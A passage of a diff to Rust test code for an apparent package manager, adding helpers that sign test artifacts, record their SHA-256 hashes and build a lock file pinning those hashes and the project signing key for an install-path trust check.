         let resolved = ResolvedPackage {
             ecosystem: package.ecosystem,
             name: package.name.clone(),
@@ -28870,6 +30040,7 @@ wheels = [
             signature: None,
         };
         sign_artifact(project_dir, &mut artifact).unwrap();
+        let artifact_sha256 = artifact_payload_sha256(&artifact).unwrap();
 
         let artifact_path = checked_join(project_dir, Path::new(&package.artifact)).unwrap();
         fs::create_dir_all(artifact_path.parent().unwrap()).unwrap();
@@ -28878,5 +30049,22 @@ wheels = [
             serde_json::to_string_pretty(&artifact).unwrap(),
         )
         .unwrap();
+        artifact_sha256
+    }
+
+    /// Build a lock for `packages`, signing+writing each artifact, pinning every
+    /// `artifact-sha256` and the project `signing-key` so it passes the F3 trust
+    /// anchor on the locked-install path (mirrors what `omc install` produces).
+    fn signed_lock_for_test(project_dir: &Path, mut packages: Vec<LockedPackage>) -> OmcLock {
+        for package in &mut packages {
+            package.artifact_sha256 = write_signed_artifact_for_test(project_dir, package);
+        }
+        OmcLock {
+            version: 1,
+            signing_key: Some(project_signing_public_key(project_dir).unwrap()),
+            packages,
+            local_sources: Vec::new(),
+            python_vcs: Vec::new(),
+        }
     }
 }
